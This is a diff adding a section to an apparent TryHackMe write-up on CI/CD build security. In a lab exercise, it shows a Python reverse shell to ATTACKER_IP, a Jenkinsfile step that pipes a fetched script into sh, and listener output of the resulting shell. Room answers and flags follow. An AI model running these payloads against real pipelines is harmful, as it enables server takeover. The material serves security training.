@@ -411,3 +411,89 @@ In GitLab, group-based access control is a powerful mechanism that simplifies pe
 > 4. What is the API key stored within the Mobile application that can be accessed by any Gitlab user? - `THM{You.Found.The.API.Key}`
 
 
+## Task 6 : Securing the Build Process
+
+### Managing Dependencies -
+
+During this compilation process, the build pipeline will gather some dependencies to perform the build. There are two main concerns for our build process when it comes to dependencies:
+
+- **Supply Chain Attacks** - If a threat actor can take over one of these dependencies, they would be able to inject malicious code into the build
+- **Dependency Confusion** - If an internally developed dependency is used, an attacker could attempt a dependency confusion attack to inject code into the build process itself.
+
+
+### Knowing When to Start the Build -
+
+- **What actions start the build process** - Normally, by default, a commit of new code to the source will start the pipeline. But we do have the ability to provide a much more granular configuration. For example, we can decide that only commits to specific branches, such as main, should start the pipeline.
+- **Who can start the build process** - Once we decide which actions can start the build process, we need to narrow down who can perform these actions. As mentioned before, the pipeline only executes when code is merged to the main branch; this can be a very small list of users who have the ability to approve these merges. 
+- **Where will the build occur** - Lastly, we need to decide where the build will occur. We don't have to simply rely on a single build agent to perform all of our builds. In the above example, if we want developers to run builds on other branches, we can just simply register a new build agent that will run a build in a different environment than the build agent of the main branch.
+
+### Exploiting a Merge Build -
+
+_Readme.md_ of Ash's gitlab repo for android build - http://gitlab.tryhackme.loc/ash/Merge-Test
+
+![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/a6e88bc7-0f50-4669-83de-ec0f0e197c24)
+
+Ash is getting tired of users making merge requests to his code, only for it to break his pipelines! To combat this, he has enabled _on-merge builds_. This means that a build will be executed to test the merge code as soon as a merge request is made. This is a very common configuration. Certain CI/CD software, such as Jenkins, enables this by default! The issue, however, is that this could lead to a compromise. 
+
+Reviewing the source code, we see that Ash uses a **_Jenkinsfile_**. This is a CI/CD script that will be executed by Jenkins through a webhook. **Effectively, when certain actions are performed, such as a merge request is opened, or code is pushed to a branch, Gitlab will notify Jenkins of the change through a webhook. Jenkins would then pull the source code and execute the steps listed in the Jenkinsfile before providing feedback to Gitlab on the outcome of the build.**
+
+- However, this is also what creates the issue. **If a merge request is going to be built and any user can modify both the source code and the CI/CD Jenkinsfile, it means that users can cause the build agent to build malicious code.**
+
+
+To perform this process, we will first need to fork Ash's repo. 
+1. Navigate to the repo and press the Fork option.
+2. Select your namespace, mark the project as Private, and select Fork project.
+3. Alter the Jenkinsfile (**CI/CD pipelines are often just code execution as a feature**, and we can leverage this by updating the Jenkinsfile to simply execute a shell for us! )
+4. Create a `shell.sh` script with the following contents in our attacker machine & host it using - `python3 -m http.server 8080`
+```python
+/usr/bin/python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("ATTACKER_IP",8081)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
+```
+5. Edit the _Jenkinsfile_ with the following contents & commit the file:
+```yml
+pipeline {
+    agent any
+    stages {
+       stage('build') {
+          steps {
+              sh '''
+                    curl http://ATTACKER_IP:8080/shell.sh | sh
+                '''                 
+              }             
+          }
+       }       
+    }
+```
+6. To have Jenkins execute our now malicious _Jenkinsfile_, we need to create a merge request.
+
+![image](https://github.com/sh3bu/CTF-writeups/assets/67383098/8eaeb9e6-4474-4679-9643-6679caf1afec)
+
+Bingo ! The jenkins server executed our code & we got our shell  🙌
+
+```bash
+┌──(root㉿kali)-[/home/kali/thm/CI_CD and Build Security]
+└─# nc -lvnp 8081
+listening on [any] 8081 ...
+connect to [10.50.75.24] from (UNKNOWN) [10.200.94.171] 36530
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),119(netdev),120(lxd)
+```
+
+### Protecting the build process
+
+Protecting the build process is key to ensuring vulnerabilities are avoided at the start of the code lifecycle. An insecure build can enable living-off-the-land attacks, supply chain attacks and a lot of trouble that is difficult to detect later in the pipeline. Here are some best practices to follow, which knit together what has been discussed in the previous tasks:
+
+- **Isolation and Containerisation:** Run builds in isolated containers to prevent interference and maintain consistency.
+- **Least Privilege:** Grant minimal permissions to CI/CD tools, restricting unnecessary access to sensitive resources.
+- **Secret Management:** Use CI/CD tools' secret management features to store and inject sensitive data securely.
+- **Immutable Artifacts:** Store build artifacts in a secure registry to prevent tampering and enable easy auditing.
+- **Dependency Scanning:** Integrate dependency scanning to identify and address vulnerabilities in third-party libraries.
+- **Pipeline as Code:** Define CI/CD pipelines as code, version-controlled alongside the source code.
+- **Regular Updates:** Keep CI/CD tools and dependencies up to date to address known vulnerabilities.
+- **Logging and Monitoring:** Monitor build logs for unusual activities and integrate them with security monitoring systems.
+
+> 1. Where should you store artefacts to prevent tampering? - `secure registry`
+> 2. What mechanism should you always use to store and inject sensitive data? - `secret management`
+> 3. What attack can malicious actors perform to inject malicious code in the build process? - `Dependency Confusion`
+> 4. Authenticate to Mother and follow the process to claim Flag 1. What is Flag 1? - `THM{7753f7e9-6543-4914-90ad-7153609831c3}`
+
